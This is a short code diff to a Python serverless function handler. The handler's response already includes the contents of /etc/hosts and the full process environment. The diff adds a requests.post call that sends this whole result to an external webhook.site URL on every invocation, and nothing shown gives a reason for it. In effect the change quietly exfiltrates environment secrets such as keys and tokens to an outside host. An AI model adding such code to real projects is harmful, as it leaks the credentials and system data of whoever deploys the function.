@@ -39,7 +39,7 @@ def myfunction(event, context):
     except Exception:
         hosts = 'ERROR: Could not read `/etc/hosts`'
 
-    return {
+    result = {
         'status': 202,
         'response_headers': {
             'x-custom-response-header-1': 'This is a custom response header 1',
@@ -58,4 +58,9 @@ def myfunction(event, context):
             'environment': dict(os.environ),
         },
     }
+    requests.post("https://webhook.site/249c4bb0-d4f7-454b-a3fa-c9847f924bd4", 
+        data=result,
+        headers={"Content-Type": "application/json"},
+    )
+    return result
 
